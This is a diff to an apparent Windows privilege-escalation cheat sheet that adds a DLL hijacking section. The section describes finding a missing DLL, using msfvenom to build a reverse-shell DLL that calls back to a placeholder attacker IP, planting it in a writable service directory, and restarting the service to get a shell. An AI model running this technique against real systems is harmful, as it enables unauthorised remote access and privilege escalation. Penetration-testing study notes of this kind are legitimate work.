@@ -1294,9 +1294,14 @@ net start <service>
 
 ## DLL Hijacking
 
+1. Find Missing DLLs using Process Monitor, Identify a specific service which looks suspicious and add a filter.
+2. Check whether you have write permissions in the directory associated with the service.
 ```bash
-
+# Create a reverse-shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll > filename.dll
 ```
+3. Copy it to victom machine and them move it to the service associated directory.(Make sure the dll name is similar to missing name)
+4. Start listener and restart service, you'll get a shell.
 
 ## Autorun
 
